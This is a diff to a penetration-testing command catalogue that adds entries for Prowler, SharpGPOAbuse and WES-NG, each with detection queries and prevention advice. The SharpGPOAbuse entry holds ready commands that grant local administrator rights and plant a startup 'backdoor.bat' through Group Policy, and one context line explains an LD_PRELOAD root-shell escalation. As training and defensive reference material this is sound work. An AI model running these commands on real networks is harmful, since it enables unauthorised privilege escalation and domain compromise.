+        "splunk_spl": "index=linux sourcetype=linux_secure \"Failed password\"\n| stats count by src_ip, user\n| where count > 10\n| sort -count",
+        "elastic_kql": "event.outcome:\"failure\" AND event.category:\"authentication\"",
+        "sentinel_kql": "Syslog\n| where SyslogMessage has \"Failed password\"\n| summarize FailCount=count() by SrcIP=extract(@\"from (\\S+)\", 1, SyslogMessage), User=extract(@\"for (\\S+)\", 1, SyslogMessage)\n| where FailCount > 10",
+        "sigma_rules": "linux_auth_brute_force_ssh",
+        "prevention": "Account lockout policies; fail2ban; rate limiting; MFA; strong password requirements; IP allowlisting for admin services.",
+        "sources": [
+          "OSCP methodology",
+          "https://attack.mitre.org/techniques/T1110/001/"
+        ],
+        "detections": [
+          {
+            "platform": "sigma",
+            "name": "SSH brute force from single source",
+            "logic": "title: SSH Brute Force Attack\nstatus: experimental\nlogsource:\n  product: linux\n  service: sshd\ndetection:\n  selection:\n    sshd_auth_fail: true\n  condition: selection | count(src_ip) by src_ip > 10\n  timeframe: 5m\nlevel: high",
+            "data_source": "linux-auth",
+            "attack": [
+              "T1110.001"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "Users with mistyped passwords; automated scripts with stale credentials",
+            "tuning": "Adjust threshold based on environment; whitelist jump boxes"
           }
         ]
       }
@@ -119413,6 +121046,100 @@ const COMMAND_DATA = {
             "confidence": "high",
             "false_positives": "JavaScript debugging tools sending __proto__ in requests",
             "tuning": "Correlate with server-side errors or auth state changes"
+          }
+        ]
+      }
+    },
+    {
+      "id": "cloud-prowler-audit",
+      "name": "Prowler - Cloud Security Assessment (AWS/Azure/GCP)",
+      "command": "prowler aws --severity critical high",
+      "description": "Prowler is an open-source cloud security assessment tool covering AWS, Azure, and GCP. It checks for hundreds of security misconfigurations, compliance issues (CIS, NIST, PCI-DSS, HIPAA), and best practice violations. Used defensively for cloud posture assessment and offensively to find privilege escalation and data exposure.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Cloud Security",
+      "subcategory": "Cloud Auditing",
+      "certifications": [
+        "CPTS",
+        "CDSA"
+      ],
+      "primary_cert": "CDSA",
+      "source": "prowler-cloud/prowler; CDSA cloud module",
+      "tags": [
+        "prowler",
+        "cloud-audit",
+        "aws",
+        "azure",
+        "gcp",
+        "cis-benchmark",
+        "compliance",
+        "misconfiguration"
+      ],
+      "mitre": [
+        "T1580"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== INSTALL ===\n  pip3 install prowler\n  # Or: brew install prowler\n\n=== AWS SCAN ===\n  prowler aws                              # Full AWS audit\n  prowler aws --severity critical high     # Critical/high only\n  prowler aws --service s3 iam ec2         # Specific services\n  prowler aws --compliance cis_2.0_aws     # CIS benchmark\n\n=== AZURE SCAN ===\n  prowler azure                            # Full Azure audit\n  prowler azure --service defender entra   # Specific services\n\n=== GCP SCAN ===\n  prowler gcp\n\n=== OUTPUT FORMATS ===\n  prowler aws -o json         # JSON output\n  prowler aws -o csv          # CSV for spreadsheets\n  prowler aws -o html         # HTML report\n  prowler aws --output-directory /reports\n\n=== KEY FINDINGS TO LOOK FOR ===\n- S3 buckets with public access\n- IAM users with inline admin policies\n- Security groups allowing 0.0.0.0/0\n- Unencrypted EBS/RDS/S3\n- MFA not enforced\n- CloudTrail disabled\n- Root account access keys\n- Cross-account trust misconfigurations",
+      "examples": [
+        {
+          "label": "Run critical/high AWS audit",
+          "command": "prowler aws --severity critical high"
+        },
+        {
+          "label": "CIS benchmark compliance check",
+          "command": "prowler aws --compliance cis_2.0_aws -o html"
+        },
+        {
+          "label": "Audit specific AWS services",
+          "command": "prowler aws --service s3 iam ec2 lambda"
+        }
+      ],
+      "references": [
+        {
+          "title": "Prowler - GitHub",
+          "url": "https://github.com/prowler-cloud/prowler"
+        },
+        {
+          "title": "CIS AWS Foundations Benchmark",
+          "url": "https://www.cisecurity.org/benchmark/amazon_web_services"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "cloud-enumerate-iam",
+          "note": "enumerate-iam finds what creds can do; Prowler finds what is misconfigured.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "Prowler uses cloud provider APIs to systematically check hundreds of security configurations against CIS benchmarks and best practices, identifying misconfigurations that could lead to compromise.",
+        "prerequisites": "Cloud credentials with read access (SecurityAudit policy for AWS, Reader for Azure).",
+        "impact": "Identifies misconfigurations that could lead to data exposure, privilege escalation, or compliance failures.",
+        "detection": "[MITRE T1580] High volume of describe/list API calls across many services from a single identity.",
+        "artifacts": "CloudTrail/Activity Log showing systematic read-only enumeration across services.",
+        "splunk_spl": "index=aws sourcetype=aws:cloudtrail eventName=\"Describe*\" OR eventName=\"List*\" OR eventName=\"Get*\"\n| stats dc(eventName) as unique_apis by userIdentity.arn\n| where unique_apis > 50",
+        "elastic_kql": "cloud.provider:\"aws\" AND event.action:(Describe* OR List* OR Get*)",
+        "sentinel_kql": "AWSCloudTrail\n| where EventName startswith \"Describe\" or EventName startswith \"List\" or EventName startswith \"Get\"\n| summarize UniqueAPIs=dcount(EventName) by UserIdentityArn, bin(TimeGenerated, 30m)\n| where UniqueAPIs > 50",
+        "sigma_rules": "aws_cloud_security_enumeration",
+        "prevention": "Restrict security audit permissions; use SCPs to limit enumeration; monitor for unusual read-only API patterns.",
+        "sources": [
+          "CDSA cloud module",
+          "https://attack.mitre.org/techniques/T1580/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "Cloud security enumeration sweep",
+            "logic": "AWSCloudTrail\n| where EventName startswith \"Describe\" or EventName startswith \"List\"\n| summarize UniqueAPIs=dcount(EventName), Services=dcount(EventSource) by UserIdentityArn, bin(TimeGenerated, 15m)\n| where Services > 10 and UniqueAPIs > 100",
+            "data_source": "cloud-trail",
+            "attack": [
+              "T1580"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "medium",
+            "false_positives": "Cloud security posture management tools; legitimate audit activities",
+            "tuning": "Whitelist known CSPM tool identities; focus on unusual identities"
           }
         ]
       }
@@ -133756,6 +135483,103 @@ const COMMAND_DATA = {
         }
       },
       "explain": "Loads a malicious shared library into a sudo-allowed command when LD_PRELOAD is kept:\n  sudo LD_PRELOAD=/tmp/root.so   force the loader to preload your library first\n  /usr/sbin/apache2 restart   an allowed sudo command that will load it\nRequires env_keep+=LD_PRELOAD in sudoers (check sudo -l). Your library's _init() constructor runs as root, spawning a root shell. Compile it with gcc -fPIC -shared -nostartfiles."
+    },
+    {
+      "id": "ad-sharpgpoabuse",
+      "name": "SharpGPOAbuse - GPO Privilege Escalation",
+      "command": ".\\SharpGPOAbuse.exe --AddComputerTask --TaskName \"Update\" --Author NT AUTHORITY\\SYSTEM --Command \"cmd.exe\" --Arguments \"/c net localgroup administrators <user> /add\" --GPOName \"<gpo_name>\"",
+      "description": "SharpGPOAbuse exploits write permissions on Group Policy Objects to add immediate scheduled tasks, local admin rights, or startup scripts that execute on all machines the GPO applies to. If you have GenericWrite/GenericAll on a GPO, you can compromise every machine in its scope.",
+      "platform": "windows",
+      "type": "command",
+      "opsec": "loud",
+      "category": "Active Directory",
+      "subcategory": "Privilege Escalation",
+      "certifications": [
+        "CRTP",
+        "CPTS"
+      ],
+      "primary_cert": "CRTP",
+      "source": "CRTP GPO abuse module; FSecureLabs/SharpGPOAbuse",
+      "tags": [
+        "gpo",
+        "group-policy",
+        "sharpgpoabuse",
+        "privilege-escalation",
+        "scheduled-task",
+        "dacl-abuse"
+      ],
+      "mitre": [
+        "T1484.001",
+        "T1053.005"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== PREREQUISITE ===\nYou need GenericWrite, GenericAll, or WriteDacl on the GPO object.\nCheck with BloodHound or PowerView:\n  Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match \"GenericWrite|GenericAll\"}\n\n=== ADD IMMEDIATE SCHEDULED TASK ===\n  .\\SharpGPOAbuse.exe --AddComputerTask --TaskName \"Update\" --Author \"NT AUTHORITY\\SYSTEM\" --Command \"cmd.exe\" --Arguments \"/c net localgroup administrators jdoe /add\" --GPOName \"Default Domain Policy\"\n\n=== ADD LOCAL ADMIN ===\n  .\\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount jdoe --GPOName \"Server Policy\"\n\n=== ADD STARTUP SCRIPT ===\n  .\\SharpGPOAbuse.exe --AddUserScript --ScriptName \"backdoor.bat\" --ScriptContents \"net localgroup administrators jdoe /add\" --GPOName \"Workstation Policy\"\n\n=== FORCE GPO UPDATE ===\n  gpupdate /force    # On target (if you have access)\n  Invoke-GPUpdate -Computer <target> -RandomDelayInMinutes 0  # Remote\n\n=== CLEANUP ===\nSharpGPOAbuse does NOT clean up. Remove the task/script manually after exploitation.",
+      "examples": [
+        {
+          "label": "Add immediate scheduled task via GPO",
+          "command": ".\\SharpGPOAbuse.exe --AddComputerTask --TaskName \"Update\" --Author \"NT AUTHORITY\\SYSTEM\" --Command \"cmd.exe\" --Arguments \"/c net localgroup administrators jdoe /add\" --GPOName \"Default Domain Policy\""
+        },
+        {
+          "label": "Add user as local admin via GPO",
+          "command": ".\\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount jdoe --GPOName \"Server Policy\""
+        },
+        {
+          "label": "Force remote GPO update",
+          "command": "Invoke-GPUpdate -Computer dc01 -RandomDelayInMinutes 0"
+        }
+      ],
+      "references": [
+        {
+          "title": "SharpGPOAbuse - GitHub",
+          "url": "https://github.com/FSecureLABS/SharpGPOAbuse"
+        },
+        {
+          "title": "MITRE T1484.001 - Domain Policy Modification",
+          "url": "https://attack.mitre.org/techniques/T1484/001/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "ad-sharpview",
+          "note": "Enumerate GPO ACLs to find writable GPOs.",
+          "rel": "prereq"
+        }
+      ],
+      "defense": {
+        "why_it_works": "GPOs are applied to all machines in scope. Write access to a GPO allows adding scheduled tasks, scripts, or group memberships that execute with SYSTEM privileges across the domain.",
+        "prerequisites": "GenericWrite/GenericAll/WriteDacl on a GPO object in Active Directory.",
+        "impact": "Local admin on all machines in the GPO scope; potential domain compromise.",
+        "detection": "[MITRE T1484.001] GPO modification events (5136); new scheduled tasks created via GPO; unexpected Group Policy changes.",
+        "artifacts": "Event 5136 (directory service changes); Event 4698 (scheduled task created); GPO version changes in SYSVOL.",
+        "splunk_spl": "index=windows EventCode=5136 ObjectClass=\"groupPolicyContainer\"\n| table _time, SubjectUserName, ObjectDN, AttributeLDAPDisplayName, AttributeValue",
+        "elastic_kql": "event.code:\"5136\" AND winlog.event_data.ObjectClass:\"groupPolicyContainer\"",
+        "sentinel_kql": "SecurityEvent\n| where EventID == 5136\n| where ObjectClass == \"groupPolicyContainer\"\n| project TimeGenerated, SubjectUserName, ObjectDN, AttributeLDAPDisplayName",
+        "sigma_rules": "win_security_gpo_modification_sharpgpoabuse",
+        "prevention": "Audit GPO ACLs regularly; restrict GenericWrite on GPOs; monitor SYSVOL for unexpected changes; use Advanced Audit Policy to log directory service changes.",
+        "sources": [
+          "CRTP GPO module",
+          "https://attack.mitre.org/techniques/T1484/001/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "SharpGPOAbuse - GPO modification by non-admin",
+            "logic": "SecurityEvent\n| where EventID == 5136\n| where ObjectClass == \"groupPolicyContainer\"\n| where SubjectUserName !in (\"SYSTEM\", \"Domain Admins\")\n| project TimeGenerated, SubjectUserName, ObjectDN, AttributeLDAPDisplayName, AttributeValue",
+            "data_source": "windows-security",
+            "log_ids": [
+              "5136"
+            ],
+            "attack": [
+              "T1484.001",
+              "T1053.005"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "Legitimate GPO administrators making changes",
+            "tuning": "Whitelist known GPO admin accounts; alert on any GPO change outside change windows"
+          }
+        ]
+      }
     },
     {
       "id": "ad-sharphound",
@@ -167755,6 +169579,101 @@ const COMMAND_DATA = {
       "explain": "wenum is an actively-maintained fork of wfuzz, a flexible command-line fuzzer especially strong at parameter and value fuzzing.:\n  -w /usr/share/seclists/Discovery/Web-Content/common.txtwordlist file\n  -u http://<ip>:<port>/get.php?x=FUZZusername / user to authenticate as\n  <ip>                     target IP address\nwenum logs every request by default, so filter: --hc hide-code (e.g. --hc 404), --hl hide-lines, --hw hide-words, --hh hide-chars; the show equivalents are --sc/--sl/--sw."
     },
     {
+      "id": "privesc-wesng",
+      "name": "WES-NG - Windows Exploit Suggester Next Generation",
+      "command": "python3 wes.py systeminfo.txt -e --color",
+      "description": "Windows Exploit Suggester - Next Generation (WES-NG) compares a targets systeminfo output against the Microsoft vulnerability database to find missing patches and suggest exploits. Unlike the original WES, it works entirely offline after downloading the database and supports modern Windows versions.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "silent",
+      "category": "Post-Exploitation",
+      "subcategory": "Privilege Escalation",
+      "certifications": [
+        "OSCP",
+        "CPTS"
+      ],
+      "primary_cert": "OSCP",
+      "source": "bitsadmin/wesng; OSCP Windows privesc methodology",
+      "tags": [
+        "wes-ng",
+        "wesng",
+        "exploit-suggester",
+        "windows-privesc",
+        "missing-patches",
+        "kernel-exploit"
+      ],
+      "mitre": [
+        "T1068"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== INSTALL ===\n  git clone https://github.com/bitsadmin/wesng\n  cd wesng\n  python3 wes.py --update   # Download latest vuln database\n\n=== ON TARGET (gather info) ===\n  systeminfo > systeminfo.txt\n  # Transfer systeminfo.txt to attacker\n\n=== ON ATTACKER (find exploits) ===\n  python3 wes.py systeminfo.txt -e --color\n  # -e = show only exploits (not just vulns)\n  # --color = colored output\n\n=== FILTER BY IMPACT ===\n  python3 wes.py systeminfo.txt -e -i \"Elevation of Privilege\"\n  python3 wes.py systeminfo.txt -e -i \"Remote Code Execution\"\n\n=== COMPARE TO INSTALLED KBS ===\n  # On target, also grab:\n  wmic qfe list full > hotfixes.txt\n  # Combine for more accuracy:\n  python3 wes.py systeminfo.txt --hotfixes hotfixes.txt -e\n\n=== COMMON HITS ===\n- PrintSpoofer / PrintNightmare (CVE-2021-1675)\n- JuicyPotato / SweetPotato (SeImpersonatePrivilege)\n- EternalBlue (MS17-010)\n- HiveNightmare / SeriousSam (CVE-2021-36934)",
+      "examples": [
+        {
+          "label": "Find exploits from systeminfo",
+          "command": "python3 wes.py systeminfo.txt -e --color"
+        },
+        {
+          "label": "Filter for privilege escalation only",
+          "command": "python3 wes.py systeminfo.txt -e -i \"Elevation of Privilege\""
+        },
+        {
+          "label": "Include hotfix data for accuracy",
+          "command": "python3 wes.py systeminfo.txt --hotfixes hotfixes.txt -e --color"
+        }
+      ],
+      "references": [
+        {
+          "title": "WES-NG - GitHub",
+          "url": "https://github.com/bitsadmin/wesng"
+        },
+        {
+          "title": "MITRE T1068 - Exploitation for Privilege Escalation",
+          "url": "https://attack.mitre.org/techniques/T1068/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "privesc-runascs",
+          "note": "RunasCs for impersonation after finding creds; WES-NG for kernel exploits.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "WES-NG cross-references the exact OS build and installed hotfixes against Microsofts vulnerability database to identify known exploitable CVEs that have not been patched.",
+        "prerequisites": "Access to run systeminfo on the target Windows machine.",
+        "impact": "Identifies kernel exploits and privilege escalation paths for unpatched vulnerabilities.",
+        "detection": "[MITRE T1068] Post-exploitation enumeration (systeminfo execution); known exploit binary execution.",
+        "artifacts": "Command history showing systeminfo; process creation of known exploit binaries.",
+        "splunk_spl": "index=sysmon EventCode=1 (CommandLine=\"*systeminfo*\" OR CommandLine=\"*wmic qfe*\")\n| table _time, User, CommandLine, ParentCommandLine",
+        "elastic_kql": "process.command_line:(*systeminfo* OR *wmic*qfe*)",
+        "sentinel_kql": "SecurityEvent\n| where EventID == 4688\n| where CommandLine has \"systeminfo\" or CommandLine has \"wmic qfe\"\n| project TimeGenerated, Account, CommandLine, ParentProcessName",
+        "sigma_rules": "proc_creation_win_systeminfo_execution",
+        "prevention": "Patch management; regular Windows Update; WSUS/SCCM for enterprise patching; remove SeImpersonatePrivilege from service accounts.",
+        "sources": [
+          "OSCP methodology",
+          "https://attack.mitre.org/techniques/T1068/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "Systeminfo enumeration for exploit suggestion",
+            "logic": "SecurityEvent\n| where EventID == 4688\n| where CommandLine has \"systeminfo\" and Account !has \"SYSTEM\"\n| project TimeGenerated, Account, CommandLine, ParentProcessName, NewProcessName",
+            "data_source": "windows-security",
+            "log_ids": [
+              "4688"
+            ],
+            "attack": [
+              "T1068"
+            ],
+            "fidelity": "telemetry",
+            "confidence": "low",
+            "false_positives": "System administrators running systeminfo for diagnostics",
+            "tuning": "Correlate with other privesc indicators; filter known admin accounts"
+          }
+        ]
+      }
+    },
+    {
       "type": "command",
       "platform": "linux",
       "requires": [
@@ -181020,8 +182939,8 @@ const COMMAND_DATA = {
       }
     }
   ],
-  "totalCommands": 985,
-  "buildDate": "2026-11-10T12:40:00.194Z",
+  "totalCommands": 1006,
+  "buildDate": "2026-11-10T12:53:56.337Z",
   "certifications": [
     "CDSA",
     "CPTS",
